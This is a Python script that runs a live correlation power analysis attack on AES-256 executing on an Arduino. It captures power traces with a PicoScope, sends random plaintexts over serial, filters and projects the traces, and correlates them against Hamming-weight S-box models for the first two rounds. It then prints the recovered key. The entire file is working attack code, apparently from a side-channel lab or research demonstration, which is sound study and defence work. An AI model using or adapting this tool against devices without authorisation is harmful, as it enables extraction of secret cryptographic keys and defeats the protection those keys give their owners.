import sys
import serial
import time
import socket
import numpy as np
import matplotlib.pyplot as plt
from scipy import signal
import scipy.io as sio
# import redpitaya_scpi as scpi
from pypico.v01 import PicoScope5244D as ps
from scalib import scalib as sca

filtering = True

# configuring the PicoScope
pico = ps.PicoScope()
pico.setResolution(resolution='14bit')
pico.setChannel(channel='A',coupling_type='AC',voltage_range='1V',probe=1)
# pico.setChannel(channel='B',coupling_type='AC',voltage_range='2V',probe=1)
pico.disableChannel(channel='B')
pico.setSimpleTrigger(channel='ext',threshold_mV=300,direction='rising',delay_samples=0,timeout_ms=5000)
# timebase=2 corresponds to a 250MS/s sampling frequency with resolution on 12 bits
# timebase=3 corresponds to a 125MS/s sampling frequency with resolution on 12 bits
pico.setSamplingParameters(preTrigger_ns=0,postTrigger_ns=1.5e5,timebase=3)

samplingParameters = pico.getSamplingParameters()

# connection info to Arduino
# ser_port = '/dev/tty.usbmodem14101'
# ser_port = '/dev/tty.usbmodem1421'
ser_port = 'COM5'
ser_baud = 19200
ser_timeout = 5
ser = serial.Serial(ser_port, ser_baud, timeout=ser_timeout)
s = ser.readline()
print(s.decode())

# projection profiles
filename = 'data/model/PP_CPA_infosec.mat'
mat_contents = sio.loadmat(filename)
alphas = mat_contents['alphas']

print('\n==================================')
print('=                                =')
print('=     LIVE ATTACK OF AES-256     =')
print('=                                =')
print('==================================\n')

# input('Press enter to proceed...\n')

ENC_TXT = bytes([0x10])

# nl = 16384 # number of samples per trace
n_attack_traces = 250
n_bytes = 16

fs = 125 # sampling frequency [MHz]
cutoff = 30 # cutoff frequency [MHz]
# width = 4 # transition width [MHz]
# attenuation = 65 # stop band attenuation [dB]

# variables for correlations
traces = np.zeros((n_attack_traces,32))
hw = np.zeros((n_attack_traces,256,32))

# accumulators for correlation
sum_x = np.zeros(32) # projected trace
sum_x2 = np.zeros(32)
sum_y = np.zeros((256,32)) # model
sum_y2 = np.zeros((256,32))
sum_xy = np.zeros((256,32))

r = np.zeros((256,32))

key_hyp = np.arange(256,dtype=int)

best_keys_r0 = np.zeros(16,dtype=int)
best_keys_r1 = np.zeros(16,dtype=int)

# for handling timeout with red pitaya commands
# maxTimeoutInARow = 5

pico.flush()

# print('-------------------------')
# print('      Attack start       ')
# print('-------------------------')
# print()

plt.figure(1,figsize=(10,5))

traces_sum = np.zeros(alphas.shape[0])

for i in range(n_attack_traces):

    #########################
    ### TRACE ACQUISITION ###
    #########################

    # print('-------------------------')
    # print('Trace ' + str(i+1))
    # print('-------------------------')

    # oscilloscope waiting for trigger
    pico.run()

    # sending plaintext
    plaintext = np.random.randint(0,256,16)
    # plaintext = np.random.bytes(16)
    ser.write(ENC_TXT)
    s = ser.readline()
    # ser.write(plaintext)
    ser.write(plaintext.astype(dtype=np.uint8).tobytes())

    # wait for trigger
    pico.waitForTrigger()

    # ciphertext recovery
    ciphertext = ser.read(16)

    # trace acquisition
    rawdata = pico.getChannelValues('A')
    trace = np.asarray(rawdata)

    ######################
    ### PRE-PROCESSING ###
    ######################

    if(filtering):
        # trace = sca.window_LP_filter(trace,fs=fs,cutoff=30)
        # trace = sca.window_HP_filter(trace,fs=fs,cutoff=1)
        # trace = sca.window_LP_filter(trace,fs=fs,cutoff=18)
        # trace = sca.window_HP_filter(trace,fs=fs,cutoff=3)

        trace = sca.kaiser_LP_filter(traces=trace,fs=125,cutoff=10,width=4,attenuation=65)
        
        # trace /= np.std(trace)
        # trace = (trace-np.mean(trace))/np.std(trace)

        trace = sca.kaiser_LP_filter(np.abs(trace),fs=125,cutoff=10,width=4,attenuation=65)
        # trace = sca.window_BP_filter(trace,fs=fs,cutoff_low=1,cutoff_high=30)

    #############################
    ### ATTACK ON FIRST ROUND ###
    #############################

    # x_r0 = np.frombuffer(plaintext, dtype=np.uint8).astype(int)
    x_r0 = plaintext

    for target_byte in np.arange(n_bytes):

        y = sca.AES_AddRoundKey(key_hyp,x_r0[target_byte])
        z = sca.AES_Sbox(y)
        hw_z = sca.hamming_weigth(z).ravel()

        tr = np.matmul(trace[None,:],alphas[:,target_byte])

        hw[i,:,target_byte] = hw_z
        traces[i,target_byte] = tr

        A = hw[:i,:,target_byte]
        B = traces[:i,target_byte]

        if(i>=10):
            r[:,target_byte] = sca.corr(A,B)

        # sum_x[target_byte] += tr
        # sum_x2[target_byte] += tr**2
        # sum_y[:,target_byte] += hw_z
        # sum_y2[:,target_byte] += hw_z**2
        # sum_xy[:,target_byte] += tr*hw_z

        # if(i>=5):
        #   num = (i+1)*sum_xy[:,target_byte] - sum_x[target_byte]*sum_y[:,target_byte]
        #   den = np.sqrt(((i+1)*sum_x2[target_byte])-(sum_x[target_byte]**2))
        #   den *= np.sqrt(((i+1)*sum_y2[:,target_byte])-(sum_y[:,target_byte]**2))
        #   r[:,target_byte] = num/den

        best_keys_r0[target_byte] = np.argmax(np.absolute(r[:,target_byte]))

    

    ##############################
    ### ATTACK ON SECOND ROUND ###
    ##############################

    y_r0 = sca.AES_AddRoundKey(best_keys_r0,x_r0)
    z_r0 = sca.AES_Sbox(y_r0)
    w_r0 = sca.AES_ShiftRows(z_r0[None,:])
    x_r1 = sca.AES_MixColumns(w_r0).ravel()

    for target_byte in np.arange(n_bytes):

        y = sca.AES_AddRoundKey(key_hyp,x_r1[target_byte])
        z = sca.AES_Sbox(y)
        hw_z = sca.hamming_weigth(z).ravel()

        tr = np.matmul(trace[None,:],alphas[:,target_byte+16])

        hw[i,:,target_byte+16] = hw_z
        traces[i,target_byte+16] = tr

        A = hw[:i,:,target_byte+16]
        B = traces[:i,target_byte+16]

        if(i>=10):
            r[:,target_byte+16] = sca.corr(A,B)

        # sum_x[target_byte+16] += tr
        # sum_x2[target_byte+16] += tr**2
        # sum_y[:,target_byte+16] += hw_z
        # sum_y2[:,target_byte+16] += hw_z**2
        # sum_xy[:,target_byte+16] += tr*hw_z

        # if(i>=5):
        #   num = (i+1)*sum_xy[:,target_byte+16] - sum_x[target_byte+16]*sum_y[:,target_byte+16]
        #   den = np.sqrt(((i+1)*sum_x2[target_byte+16])-(sum_x[target_byte+16]**2))
        #   den *= np.sqrt(((i+1)*sum_y2[:,target_byte+16])-(sum_y[:,target_byte+16]**2))
        #   r[:,target_byte+16] = num/den

        best_keys_r1[target_byte] = np.argmax(np.absolute(r[:,target_byte+16]))

    #######################
    ### DISPLAY RESULTS ###
    #######################

    traces_sum += trace.ravel()
    traces_avg = traces_sum/(i+1)

    # plt.clf()
    # plt.subplot(2,1,1)
    # plt.plot(trace.ravel())
    # plt.title('Trace ' + str(i+1) + ' (' + str(n_attack_traces) + ')',fontsize=20)
    # plt.ylabel('current',fontsize=15)
    # plt.xlabel('time samples',fontsize=15)
    # plt.subplot(2,1,2)
    # plt.plot(traces_avg)
    # plt.ylabel('average',fontsize=15)
    # plt.xlabel('time samples',fontsize=15)
    # plt.draw()
    # plt.pause(0.01)

    best_keys = np.concatenate((best_keys_r0,best_keys_r1))

    if(i>=10):

        s_hex = ''.join('%02x ' % b for b in best_keys_r0)
        # print('ROUND KEY 1: ' + s_hex)

        s_hex = ''.join('%02x ' % b for b in best_keys_r1)
        # print('ROUND KEY 2: ' + s_hex)

        s_hex = str(bytes(best_keys.astype('uint8')))
        # s_hex += ' '*30
        # print('\nBest key guess: ' + s_hex)

        print('Trace: %d of %d' % (i+1, n_attack_traces))
        # print(s_hex[1:-1])
        print('Key found: ' + s_hex[2:-1])
        # print('Key found (' + str(i+1) + '/' + str(n_attack_traces) + '): ' + s_hex, end='', flush=True)

    # print()

    # time.sleep(0.5)

# key_prob = np.concatenate((key_prob_r0,key_prob_r1),axis=1)

# s = bytes(best_keys.astype('uint8')).decode()
print('\n')

s = str(bytes(best_keys.astype('uint8')))
print('\n***************************************\n')
print('KEY FOUND: ' + s)
print('\n***************************************\n')

pico.stop()
ser.close()

# plt.plot(key_prob)
plt.show()


